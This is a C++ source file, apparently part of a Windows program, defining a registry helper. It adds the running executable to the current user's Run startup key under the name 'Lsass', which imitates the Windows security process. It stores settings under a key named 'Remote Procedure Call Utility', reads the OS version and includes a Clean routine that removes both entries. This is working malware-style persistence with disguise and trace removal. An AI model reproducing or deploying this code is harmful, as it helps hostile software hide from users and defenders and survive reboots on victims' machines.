#include "stdafx.h"
#include "RegistryHelper.h"

using namespace utility;

RegistryHelper::RegistryHelper()
{
}


RegistryHelper::~RegistryHelper()
{
}


BOOL RegistryHelper::IsMyProgramRegisteredForStartup(PCWSTR pszAppName)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwRegType = REG_SZ;
	wchar_t szPathToExe[MAX_PATH] = {};
	DWORD dwSize = sizeof(szPathToExe);

	lResult = RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		lResult = RegGetValue(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
		fSuccess = (lResult == 0);
	}

	if (fSuccess)
	{
		fSuccess = (wcslen(szPathToExe) > 0) ? TRUE : FALSE;
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

BOOL RegistryHelper::RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
{
	HKEY hKey = NULL;
	size_t lResult = 0;
	BOOL fSuccess = TRUE;
	size_t dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};


	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	if (args != NULL)
	{
		// caller should make sure "args" is quoted if any single argument has a space
		// e.g. (L"-name \"Mark Voidale\"");
		wcscat_s(szValue, count, args);
	}

	lResult = RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = (wcslen(szValue) + 1) * 2;
		lResult = RegSetValueEx(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

void RegistryHelper::RegisterProgram()
{
	wchar_t szPathToExe[MAX_PATH];
	GetModuleFileName(NULL, szPathToExe, MAX_PATH);
	RegisterMyProgramForStartup(L"Lsass", szPathToExe, NULL);
}

string_t RegistryHelper::GetValue(string_t & key)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwRegType = REG_SZ;
	wchar_t szValue[MAX_PATH] = {};
	DWORD dwSize = sizeof(szValue);

	lResult = RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Remote Procedure Call Utility", 0, KEY_READ, &hKey);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		lResult = RegGetValue(hKey, NULL, key.c_str(), RRF_RT_REG_SZ, &dwRegType, szValue, &dwSize);
		fSuccess = (lResult == 0);
	}

	if (fSuccess)
	{
		fSuccess = (wcslen(szValue) > 0) ? TRUE : FALSE;
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	if (fSuccess)
	{
		return string_t(szValue);
	}
	return string_t();
}

utility::string_t RegistryHelper::GetOsVersion()
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwRegType = REG_SZ;
	wchar_t szValue[MAX_PATH] = {};
	DWORD dwSize = sizeof(szValue);

	lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		lResult = RegGetValue(hKey, NULL, L"ProductName", RRF_RT_REG_SZ, &dwRegType, szValue, &dwSize);
		fSuccess = (lResult == 0);
	}

	if (fSuccess)
	{
		fSuccess = (wcslen(szValue) > 0) ? TRUE : FALSE;
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	if (fSuccess)
	{
		return string_t(szValue);
	}
	return string_t();
}

void RegistryHelper::SetValue(string_t &key, string_t & value)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	size_t dwSize;

	const size_t count = MAX_PATH * 2;
	
	lResult = RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Remote Procedure Call Utility", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = (value.length() + 1) * 2;
		lResult = RegSetValueEx(hKey, key.c_str(), 0, REG_SZ, (BYTE*)value.c_str(), dwSize);
		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return;
}


void RegistryHelper::Clean()
{
	HKEY hKey = NULL, hKey2 = NULL;
	RegOpenKeyEx(HKEY_CURRENT_USER, L"Software", 0, KEY_WRITE, &hKey);
	RegDeleteTree(hKey, L"Remote Procedure Call Utility");
	
	RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, (KEY_WRITE | KEY_READ), &hKey2);
	RegDeleteValue(hKey2, L"Lsass");

	return;
}